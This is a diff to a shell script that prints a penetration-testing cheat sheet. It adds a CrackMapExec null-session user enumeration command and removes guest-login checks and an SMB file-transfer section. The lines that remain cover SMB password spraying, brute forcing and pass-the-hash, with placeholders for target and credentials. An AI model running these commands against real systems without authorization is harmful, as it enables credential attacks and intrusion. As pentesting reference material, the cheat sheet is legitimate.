@@ -44,13 +44,12 @@ echo -e ""
 
 echo -e "${Frame}###${End} ${Title}Crackmapexec${End} ${Frame}###${End}"
 echo -e "${Link}https://wiki.porchetta.industries/${End}"
-echo -e "${Point} crackmapexec smb \$IP -u '' -p ''"
-echo -e "${Point} crackmapexec smb \$IP -u 'guest' -p ''"
 echo -e "${Point} crackmapexec smb \$IP -u 'guest' -p '' --shares"
 echo -e "${Point} crackmapexec smb \$IP -u '\$user' -p '\$password'"
 echo -e "${Point} crackmapexec smb \$IP -u '\$user' -H '\$hash'"
 echo -e "${Point} crackmapexec smb \$IP -u '\$user' -p \$pwdlist"
 echo -e "${Point} crackmapexec smb \$IP -u \$userlist -p \$pwdlist"
+echo -e "${Point} crackmapexec smb \$IP -u '' -p '' --users | awk '{print \$5}' | uniq"
 echo -e ""
 
 
@@ -64,10 +63,3 @@ echo -e "${Frame}###${End} ${Title}Virtual Hard Disk (mount)${End} ${Frame}###${
 echo -e "${Point} 7z l vhdfile.vhd"
 echo -e "${Point} sudo guestmount --add /mnt/remote/path/to/vhdfile.vhd --inspector --ro /mnt/vhd/ -v"
 echo -e ""
-
-
-echo -e "${Frame}###${End} ${Title}Files Transfer${End} ${Frame}###${End}"
-echo -e "${Point} impacket-smbserver smb_share . ${Comment}# server${End}"
-echo -e "    net use * \\\\$ip\smb_share ${Comment}# client${End}"
-echo -e "    copy Z:\\\file.txt ${Comment}# get from server${End}"
-echo -e "    copy file.txt Z:\\ ${Comment}# sent to server${End}"
